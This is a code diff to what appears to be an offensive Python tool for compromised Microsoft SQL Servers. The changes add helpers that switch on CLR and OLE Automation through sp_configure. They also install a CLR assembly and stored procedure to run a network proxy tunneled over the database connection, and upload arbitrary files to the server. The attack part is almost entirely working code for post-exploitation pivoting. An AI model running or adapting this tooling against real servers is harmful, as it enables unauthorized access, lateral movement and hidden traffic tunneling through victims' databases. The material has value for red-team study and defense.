@@ -42,8 +42,40 @@ PROCEDURE_NAME = "sp_start_proxy"
 
 
 
+
+def set_configuration(mssql, option, value):
+    mssql.batch("exec master.dbo.sp_configure '%s',%d; RECONFIGURE;" % (option, value))
+    return check_configuration(mssql, option, value)
+
+
+def check_configuration(mssql, option, value):
+    try:
+        res = mssql.batch("SELECT cast(value as INT) as v FROM sys.configurations where name = '%s'" % option)[0]['v']
+        return res == value
+    except:
+        return False
+
+def file_exists(mssql, path):
+    try:
+        res = mssql.batch("DECLARE @r INT; EXEC master.dbo.xp_fileexist '%s', @r OUTPUT; SELECT @r as n" % path)[0]['n']    
+        return res == 1
+    except:
+        return False
+
+
 def proxy_install(mssql, args):
     logging.info("Proxy mode: install")
+    
+    if set_configuration(mssql, 'show advanced options', 1) == False:
+        logging.error("Cannot enable 'show advanced options'")
+        return
+    
+    if set_configuration(mssql, 'clr enabled', 1) == False:
+        logging.error("Cannot enable CLR")
+        return
+    else:
+        logging.info("CLR enabled")
+        
     
     with open(args.clr, 'rb') as f:
         data = f.read().encode('hex')
@@ -81,28 +113,48 @@ def proxy_uninstall(mssql, args):
         logging.info("Assembly successfully uninstalled")
     else:
         logging.error("Cannot uninstall assembly")
+        
+    if set_configuration(mssql, 'show advanced options', 1) == False:
+        logging.error("Cannot enable 'show advanced options'")
+    else:
+        if set_configuration(mssql, 'clr enabled', 0) == False:
+            logging.error("Cannot disable CLR")
+        else:
+            logging.info("CLR disabled")
 
 
 def proxy_check(mssql, args):
+    success = True
+    
     logging.info("Proxy mode: check")
     
     res = mssql.batch("USE msdb; SELECT COUNT(*) AS n FROM sys.assemblies where name = '%s'" % ASSEMBLY_NAME)[0]['n']
     if res == 1:
         logging.info("Assembly is installed")
     else:
+        success = False
         logging.error("Assembly not found")
     
     res = mssql.batch("SELECT COUNT(*) AS n FROM sys.procedures where name = '%s'" % PROCEDURE_NAME)[0]['n']    
     if res == 1:
         logging.info("Procedure is installed")
     else:
+        success = False
         logging.error("Procedure not found")
-    
-    res = mssql.batch("DECLARE @r INT; EXEC master.dbo.xp_fileexist '%s', @r OUTPUT; SELECT @r as n" % args.reciclador)[0]['n']    
-    if res == 1:
+      
+    if file_exists(mssql, args.reciclador):
         logging.info("reciclador is installed")
     else:
+        success = False
         logging.error("reciclador not found")
+        
+    if check_configuration(mssql, 'clr enabled', 1):
+        logging.info("clr enabled")
+    else:
+        success = False
+        logging.error("clr disabled")
+    
+    return success
 
 
 def proxy_worker(server, client):
@@ -137,9 +189,12 @@ def proxy_worker(server, client):
                 client.sendall(data)
 
 
-def proxy_start(mssql, args):
-    logging.info("Proxy mode: start")
+def proxy_start(mssql, args):    
+    if not proxy_check(mssql, args):
+        return
 
+    logging.info("Proxy mode: start")
+    
     laddr, lport = mssql.socket.getsockname()
     if args.no_check_src_port:
         lport = 0
@@ -163,9 +218,10 @@ def proxy_start(mssql, args):
                     "EXEC msdb.dbo.%s '%s', @ip, %d" % (PROCEDURE_NAME, args.reciclador, lport), tuplemode=False, wait=False)
         data = mssql.socket.recv(2048)
         if 'Powered by blackarrow.net' in data:
-            logging.debug("ACK from server!")
+            logging.info("ACK from server!")
             mssql.socket.sendall("ACK")
         else:
+            logging.error("cannot establish connection")
             raise Exception('cannot establish connection')
 
         s.listen(10)
@@ -237,7 +293,11 @@ if __name__ == '__main__':
             except:
                 logging.error("upload: invalid params")
                 return
-
+            
+            if check_configuration(self.sql, 'Ole Automation Procedures', 0):
+                if self.do_enable_ole(None) == False:
+                    return
+            
             print("[+] Uploading '%s' to '%s'..." % (local, remote))
             try:
                 with open(local, 'rb') as f:
@@ -253,27 +313,38 @@ if __name__ == '__main__':
                                        "EXEC sp_OAMethod @ob, 'SaveToFile', NULL, '%s', 2;"
                                        "EXEC sp_OAMethod @ob, 'Close';"
                                        "EXEC sp_OADestroy @ob;" % (hexdata, remote))
-                    print("[+] Upload completed")
+                                       
+                    if file_exists(self.sql, remote):
+                        print("[+] Upload completed")
+                    else:
+                        print("[-] Error uploading")                    
             except:
+                print("[-] Error uploading")   
                 pass
 
         def do_enable_ole(self, line):
             try:
-                self.sql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;"
-                                   "exec master.dbo.sp_configure 'Ole Automation Procedures', 1;RECONFIGURE;")
-                self.sql.printReplies()
-                self.sql.printRows()
+                if set_configuration(self.sql, 'show advanced options', 1) == False:
+                    logging.error("cannot enable 'show advanced options'")
+                    return False                
+                
+                if set_configuration(self.sql, 'Ole Automation Procedures', 1) == False:
+                    logging.error("cannot enable 'Ole Automation Procedures'")
+                    return False
             except:
-                pass
+                return True
 
         def do_disable_ole(self, line):
             try:
-                self.sql.sql_query("exec sp_configure 'Ole Automation Procedures', 0 ;RECONFIGURE;exec sp_configure "
-                                   "'show advanced options', 0 ;RECONFIGURE;")
-                self.sql.printReplies()
-                self.sql.printRows()
+                if set_configuration(self.sql, 'show advanced options', 1) == False:
+                    logging.error("cannot enable 'show advanced options'")
+                    return False
+                
+                if set_configuration(self.sql, 'Ole Automation Procedures', 0) == False:
+                    logging.error("cannot disable 'Ole Automation Procedures'")
+                    return False
             except:
-                pass
+                return True
 
         def do_shell(self, s):
             os.system(s)
